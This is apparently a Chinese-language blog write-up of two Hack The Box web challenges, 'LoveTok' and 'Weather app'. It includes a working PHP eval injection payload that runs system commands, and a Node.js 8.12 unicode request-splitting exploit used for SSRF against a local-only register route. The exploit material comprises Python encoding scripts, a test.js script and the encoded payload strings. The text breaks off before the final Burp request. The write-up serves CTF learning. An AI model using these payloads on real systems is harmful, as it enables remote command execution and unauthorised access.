<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="Hack the box web 挑战"><meta name="keywords" content="wp,web"><meta name="author" content="Alex"><meta name="copyright" content="Alex"><title>Hack the box web 挑战 | Alex's blog~</title><meta name="robots" content="noindex"><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script src="https://v1.hitokoto.cn/?encode=js&amp;charset=utf-8&amp;select=.footer_custom_text" defer></script><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  hexoVersion: '5.4.0'
} </script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Alex's blog~" type="application/atom+xml">
</head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#LoveTok"><span class="toc-number">1.</span> <span class="toc-text">LoveTok</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Weather-app"><span class="toc-number">2.</span> <span class="toc-text">Weather app</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B7%AF%E7%94%B1%E4%B8%8E%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">2.1.</span> <span class="toc-text">路由与漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#register%E8%B7%AF%E7%94%B1"><span class="toc-number">2.1.1.</span> <span class="toc-text">register路由</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#login%E8%B7%AF%E7%94%B1"><span class="toc-number">2.1.2.</span> <span class="toc-text">login路由</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#weather-api%E8%B7%AF%E7%94%B1"><span class="toc-number">2.1.3.</span> <span class="toc-text">weather-api路由</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">2.2.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%BC%8F%E6%B4%9E%E6%BC%94%E7%A4%BA"><span class="toc-number">2.2.1.</span> <span class="toc-text">请求走私漏洞演示</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8ssrf%E6%B3%A8%E5%86%8C%E4%B8%80%E4%B8%AA%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7"><span class="toc-number">2.2.2.</span> <span class="toc-text">利用ssrf注册一个普通用户</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E7%9A%84%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95"><span class="toc-number">2.2.3.</span> <span class="toc-text">sql注入的利用手法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%84%E5%90%88%E6%8B%B3%E4%BF%AE%E6%94%B9admin%E5%AF%86%E7%A0%81"><span class="toc-number">2.2.4.</span> <span class="toc-text">组合拳修改admin密码</span></a></li></ol></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="https://pic4.zhimg.com/80/v2-5cb1e2bdc0644f9828029a94181f4542_1440w.jpg"></div><div class="author-info__name text-center">Alex</div><div class="author-info__description text-center">pwn</div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">60</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">55</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">分类</span><span class="pull-right">1</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Links</div><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://n0vice.top/">N0vice</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://snowywar.top/">魔法少女雪殇</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://l0ne1y.xyz/">L0ne1y</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://eeeeeeeeeeeeeeeea.cn/">eeeeeeeeeeeeeeeea</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://giles-one.github.io/">cat03</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://ulrica66666.github.io/">ulrica66666</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://i.loli.net/2021/03/05/xqReclzVihJKGUu.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Alex's blog~</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">文章</a><a class="site-page" href="/tags">标签</a><a class="site-page" href="/categories">分类</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">Hack the box web 挑战</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-01-09</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h2 id="LoveTok"><a href="#LoveTok" class="headerlink" title="LoveTok"></a>LoveTok</h2><blockquote>
<p>题目描述：True love is tough, and even harder to find. Once the sun has set, the lights close and the bell has rung… you find yourself licking your wounds and contemplating human existence. You wish to have somebody important in your life to share the experiences that come with it, the good and the bad. This is why we made LoveTok, the brand new service that accurately predicts in the threshold of milliseconds when love will come knockin’ (at your door). Come and check it out, but don’t try to cheat love because love cheats back. 💛</p>
</blockquote>
<p>题目主页有个链接可以点，传入了一个format参数，由于题目给出源码供下载，我们直接从源码里定位相关位置</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy77vkfkk0j31pa0u0ajv.jpg" alt=""></p>
<p>在TimeController里面可以看到get传来的r参数，我们继续追踪</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy77yhmpq1j31200csdhk.jpg" alt=""></p>
<p>在TimeModel里面追到了一个getTime函数，调用了eval执行代码，并且参数是我们传来的参数</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy77zglfq7j31au0lctc4.jpg" alt=""></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TimeModel</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$format</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;format = addslashes(<span class="variable">$format</span>);</span><br><span class="line"></span><br><span class="line">        [ <span class="variable">$d</span>, <span class="variable">$h</span>, <span class="variable">$m</span>, <span class="variable">$s</span> ] = [ rand(<span class="number">1</span>, <span class="number">6</span>), rand(<span class="number">1</span>, <span class="number">23</span>), rand(<span class="number">1</span>, <span class="number">59</span>), rand(<span class="number">1</span>, <span class="number">69</span>) ];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;prediction = <span class="string">&quot;+$&#123;d&#125; day +$&#123;h&#125; hour +$&#123;m&#125; minute +$&#123;s&#125; second&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getTime</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;$time = date(&quot;&#x27;</span> . <span class="keyword">$this</span>-&gt;format . <span class="string">&#x27;&quot;, strtotime(&quot;&#x27;</span> . <span class="keyword">$this</span>-&gt;prediction . <span class="string">&#x27;&quot;));&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">isset</span>(<span class="variable">$time</span>) ? <span class="variable">$time</span> : <span class="string">&#x27;Something went terribly wrong&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但是注意到，有一个addslashes会对单双引号进行过滤，因此我们无法通过常规的闭合引号来逃逸命令。</p>
<p>这时候需要用到PHP复杂变量的知识，在PHP中<code>$&#123;a&#125;</code>可以表示一个变量，示例代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">  <span class="variable">$today</span> = <span class="string">&#x27;Monday&#x27;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;Today is $&#123;today&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>输出结果如下：</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy78aafykmj30b40240sk.jpg" alt=""></p>
<p>而如果里面跟的是一个函数，那么函数将会被执行。</p>
<p>先来看看页面的phpinfo</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy78hyqi4fj31cb0u07dj.jpg" alt=""></p>
<p>查看发现没有ban掉system函数，因此可以用system来执行系统命令</p>
<p>payload如下：<code>?format=$&#123;system($_GET[0])&#125;&amp;0=ls ../</code></p>
<p>使用get传参的方式来执行命令</p>
<p>最终可以执行命令并获取到flag</p>
<h2 id="Weather-app"><a href="#Weather-app" class="headerlink" title="Weather app"></a>Weather app</h2><p>题目描述：</p>
<blockquote>
<p>A pit of eternal darkness, a mindless journey of abeyance, this feels like a never-ending dream. I think I’m hallucinating with the memories of my past life, it’s a reflection of how thought I would have turned out if I had tried enough. A weatherman, I said! Someone my community would look up to, someone who is to be respected. I guess this is my way of telling you that I’ve been waiting for someone to come and save me. This weather application is notorious for trapping the souls of ambitious weathermen like me. Please defeat the evil bruxa that’s operating this website and set me free! 🧙‍♀️</p>
</blockquote>
<p>题目给了dockerfile文件和跑docker的脚本，先本地起来</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gydayjzegfj31lr0u0ad5.jpg" alt=""></p>
<p>从页面似乎无法直接阅读出来一些有效信息，我们直接阅读网站的源码，找到路由相关的文件，发现几条重要的路由：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">router.get(<span class="string">&#x27;/register&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> res.sendFile(path.resolve(<span class="string">&#x27;views/register.html&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.post(<span class="string">&#x27;/register&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (req.socket.remoteAddress.replace(<span class="regexp">/^.*:/</span>, <span class="string">&#x27;&#x27;</span>) != <span class="string">&#x27;127.0.0.1&#x27;</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> res.status(<span class="number">401</span>).end();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">let</span> &#123; username, password &#125; = req.body;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (username &amp;&amp; password) &#123;</span><br><span class="line">		<span class="keyword">return</span> db.register(username, password)</span><br><span class="line">			.then(<span class="function">()  =&gt;</span> res.send(response(<span class="string">&#x27;Successfully registered&#x27;</span>)))</span><br><span class="line">			.catch(<span class="function">() =&gt;</span> res.send(response(<span class="string">&#x27;Something went wrong&#x27;</span>)));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> res.send(response(<span class="string">&#x27;Missing parameters&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/login&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> res.sendFile(path.resolve(<span class="string">&#x27;views/login.html&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.post(<span class="string">&#x27;/login&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">	<span class="keyword">let</span> &#123; username, password &#125; = req.body;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (username &amp;&amp; password) &#123;</span><br><span class="line">		<span class="keyword">return</span> db.isAdmin(username, password)</span><br><span class="line">			.then(<span class="function"><span class="params">admin</span> =&gt;</span> &#123;</span><br><span class="line">				<span class="keyword">if</span> (admin) <span class="keyword">return</span> res.send(fs.readFileSync(<span class="string">&#x27;/app/flag&#x27;</span>).toString());</span><br><span class="line">				<span class="keyword">return</span> res.send(response(<span class="string">&#x27;You are not admin&#x27;</span>));</span><br><span class="line">			&#125;)</span><br><span class="line">			.catch(<span class="function">() =&gt;</span> res.send(response(<span class="string">&#x27;Something went wrong&#x27;</span>)));</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> re.send(response(<span class="string">&#x27;Missing parameters&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.post(<span class="string">&#x27;/api/weather&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">	<span class="keyword">let</span> &#123; endpoint, city, country &#125; = req.body;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (endpoint &amp;&amp; city &amp;&amp; country) &#123;</span><br><span class="line">		<span class="keyword">return</span> WeatherHelper.getWeather(res, endpoint, city, country);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> res.send(response(<span class="string">&#x27;Missing parameters&#x27;</span>));</span><br><span class="line">&#125;);	</span><br></pre></td></tr></table></figure>
<h3 id="路由与漏洞分析"><a href="#路由与漏洞分析" class="headerlink" title="路由与漏洞分析"></a>路由与漏洞分析</h3><h4 id="register路由"><a href="#register路由" class="headerlink" title="register路由"></a>register路由</h4><p>我们首先来看register相关的路由：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">router.get(<span class="string">&#x27;/register&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> res.sendFile(path.resolve(<span class="string">&#x27;views/register.html&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.post(<span class="string">&#x27;/register&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (req.socket.remoteAddress.replace(<span class="regexp">/^.*:/</span>, <span class="string">&#x27;&#x27;</span>) != <span class="string">&#x27;127.0.0.1&#x27;</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> res.status(<span class="number">401</span>).end();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">let</span> &#123; username, password &#125; = req.body;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (username &amp;&amp; password) &#123;</span><br><span class="line">		<span class="keyword">return</span> db.register(username, password)</span><br><span class="line">			.then(<span class="function">()  =&gt;</span> res.send(response(<span class="string">&#x27;Successfully registered&#x27;</span>)))</span><br><span class="line">			.catch(<span class="function">() =&gt;</span> res.send(response(<span class="string">&#x27;Something went wrong&#x27;</span>)));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> res.send(response(<span class="string">&#x27;Missing parameters&#x27;</span>));</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>可以得到如下信息：</p>
<ul>
<li>register实现了一个注册功能</li>
<li><p>register路由只能由服务器本地发起访问</p>
</li>
<li><p>注册时调用db.register方法，参数可控</p>
</li>
</ul>
<p>我们追进去register方法，如下：</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gydazq3di0j31di0kmae2.jpg" alt=""></p>
<p>可以看到sql语句直接对我们传入的参数进行拼接，存在sql注入。</p>
<h4 id="login路由"><a href="#login路由" class="headerlink" title="login路由"></a>login路由</h4><p>login相关路由如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">router.get(<span class="string">&#x27;/login&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> res.sendFile(path.resolve(<span class="string">&#x27;views/login.html&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.post(<span class="string">&#x27;/login&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">	<span class="keyword">let</span> &#123; username, password &#125; = req.body;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (username &amp;&amp; password) &#123;</span><br><span class="line">		<span class="keyword">return</span> db.isAdmin(username, password)</span><br><span class="line">			.then(<span class="function"><span class="params">admin</span> =&gt;</span> &#123;</span><br><span class="line">				<span class="keyword">if</span> (admin) <span class="keyword">return</span> res.send(fs.readFileSync(<span class="string">&#x27;/app/flag&#x27;</span>).toString());</span><br><span class="line">				<span class="keyword">return</span> res.send(response(<span class="string">&#x27;You are not admin&#x27;</span>));</span><br><span class="line">			&#125;)</span><br><span class="line">			.catch(<span class="function">() =&gt;</span> res.send(response(<span class="string">&#x27;Something went wrong&#x27;</span>)));</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> re.send(response(<span class="string">&#x27;Missing parameters&#x27;</span>));</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>可以看到只要以admin的身份进行登录即可获得flag，结合我们上面对于register路由的分析，第一个想法就是我们通过sql注入来查询出admin的密码，但是insert语句并没有回显，所以我们很自然的可以想到通过insert语句来修改admin的密码，将一个随机值改为已知的值，但是我们还缺少可以利用的条件，因为register路由仅允许服务器从本地访问这个接口。</p>
<h4 id="weather-api路由"><a href="#weather-api路由" class="headerlink" title="weather-api路由"></a>weather-api路由</h4><p>天气查询的api路由如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">router.post(<span class="string">&#x27;/api/weather&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">	<span class="keyword">let</span> &#123; endpoint, city, country &#125; = req.body;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (endpoint &amp;&amp; city &amp;&amp; country) &#123;</span><br><span class="line">		<span class="keyword">return</span> WeatherHelper.getWeather(res, endpoint, city, country);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> res.send(response(<span class="string">&#x27;Missing parameters&#x27;</span>));</span><br><span class="line">&#125;);	</span><br></pre></td></tr></table></figure>
<p>我们首先获得了三个参数，注意，这三个参数是我们可控的参数，然后将其传入WeatherHelper.getWeather函数中，我们追踪进入相关函数：</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gydb5hxjnqj31j60j0tcx.jpg" alt=""></p>
<p>可以看到我们的参数被传入到一个url里面做拼接，即我们发起的请求是可控的，存在ssrf漏洞。</p>
<p>但是是get请求，无法达到我们想要的对register接口的post请求，观察dockerfile文件</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> node:<span class="number">8.12</span>.<span class="number">0</span>-alpine</span><br><span class="line"></span><br><span class="line"><span class="comment"># Install packages</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> apk add --update --no-cache supervisor</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Setup app</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> mkdir -p /app</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Add application</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="bash"> /app</span></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> challenge .</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Install dependencies</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> npm install</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Setup superivsord</span></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> config/supervisord.conf /etc/supervisord.conf</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Expose the port node-js is reachable on</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">80</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Start the node-js application</span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> [<span class="string">&quot;/usr/bin/supervisord&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;/etc/supervisord.conf&quot;</span>]</span></span><br></pre></td></tr></table></figure>
<p>可以发现环境为node8.12，nodejs 8.12存在请求走私漏洞，在发起请求的时候由于对unicode字符处理不当，可以被用来构造换行符来修改http流量，夹带一个额外的请求，即”请求走私“，具体漏洞原理在<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2894">通过拆分攻击实现的SSRF攻击</a>。</p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>漏洞利用的方式就比较清晰了，首先利用ssrf漏洞来对register接口发起请求，由于register路由对应的处理器存在sql注入漏洞，通过sql注入修改admin的密码，即可成功拿到flag。</p>
<h4 id="请求走私漏洞演示"><a href="#请求走私漏洞演示" class="headerlink" title="请求走私漏洞演示"></a>请求走私漏洞演示</h4><p>我们开一个docker以后，监听一个本地的5000端口，然后使用node发起一个get请求。</p>
<p>构造http报文如下：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?id=1</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:9999	# 这里用9999端口，就是为了证明我们监听的是5000端口，但是这部分是我们走私报文来控制的，即可以人为构造</span><br><span class="line"></span><br><span class="line">POST /register HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 29</span><br><span class="line"></span><br><span class="line">username=lemon&amp;password=lemon</span><br><span class="line"></span><br><span class="line"><span class="keyword">GET</span> <span class="string">/test</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:5000</span><br></pre></td></tr></table></figure>
<p>转换脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&quot;&quot;&quot;HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1:9999</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">POST /register HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Content-Length: 29</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">username=lemon&amp;password=lemon</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">GET /test&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">print(payload.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;\\u010D\\u010A&#x27;</span>).replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\\u0120&#x27;</span>))</span><br></pre></td></tr></table></figure>
<p>注意，报文的头尾是不需要一些控制的字段，因为发起请求的时候会自动补齐一些字段，我们要做的就是”走私“中间的报文</p>
<p>test.js内容如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">&quot;http&quot;</span>);</span><br><span class="line">http.get(<span class="string">&quot;http://127.0.0.1:5000/?id=1\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1:9999\u010D\u010A\u010D\u010APOST\u0120/register\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1\u010D\u010AContent-Type:\u0120application/x-www-form-urlencoded\u010D\u010AContent-Length:\u012029\u010D\u010A\u010D\u010Ausername=lemon&amp;password=lemon\u010D\u010A\u010D\u010AGET\u0120/test&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>监听本机的5000端口</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nohup nc -lvvp 5000 &gt;&gt; out.log &amp;</span><br></pre></td></tr></table></figure>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gye5g4pctzj31ic0q8gq3.jpg" alt=""></p>
<p> 可以看到服务器已经成功解析我们走私的报文</p>
<h4 id="利用ssrf注册一个普通用户"><a href="#利用ssrf注册一个普通用户" class="headerlink" title="利用ssrf注册一个普通用户"></a>利用ssrf注册一个普通用户</h4><p>那么我们可以循序渐进，首先来注册一个普通用户出来</p>
<p>利用手法同上，我们构造http报文如下：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"></span><br><span class="line">POST /register HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 29</span><br><span class="line"></span><br><span class="line">username=lemon&amp;password=lemon</span><br><span class="line"></span><br><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1</span><br></pre></td></tr></table></figure>
<p>转换脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&quot;&quot;&quot;HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">POST /register HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Content-Length: 29</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">username=lemon&amp;password=lemon</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">GET /&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">print(payload.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;\\u010D\\u010A&#x27;</span>).replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\\u0120&#x27;</span>))</span><br></pre></td></tr></table></figure>
<p>得到payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP&#x2F;1.1\u010D\u010AHost:\u0120127.0.0.1\u010D\u010A\u010D\u010APOST\u0120&#x2F;register\u0120HTTP&#x2F;1.1\u010D\u010AHost:\u0120127.0.0.1\u010D\u010AContent-Type:\u0120application&#x2F;x-www-form-urlencoded\u010D\u010AContent-Length:\u012029\u010D\u010A\u010D\u010Ausername&#x3D;lemon&amp;password&#x3D;lemon\u010D\u010A\u010D\u010AGET\u0120&#x2F;</span><br></pre></td></tr></table></figure>
<p>前面绑定需要请求的地址即127.0.0.1，最终endpoint位点处的payload如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1&#x2F;\u0120HTTP&#x2F;1.1\u010D\u010AHost:\u0120127.0.0.1\u010D\u010A\u010D\u010APOST\u0120&#x2F;register\u0120HTTP&#x2F;1.1\u010D\u010AHost:\u0120127.0.0.1\u010D\u010AContent-Type:\u0120application&#x2F;x-www-form-urlencoded\u010D\u010AContent-Length:\u012029\u010D\u010A\u010D\u010Ausername&#x3D;lemon&amp;password&#x3D;lemon\u010D\u010A\u010D\u010AGET\u0120&#x2F;</span><br></pre></td></tr></table></figure>
<p>利用burp来打，报文如下：</p>
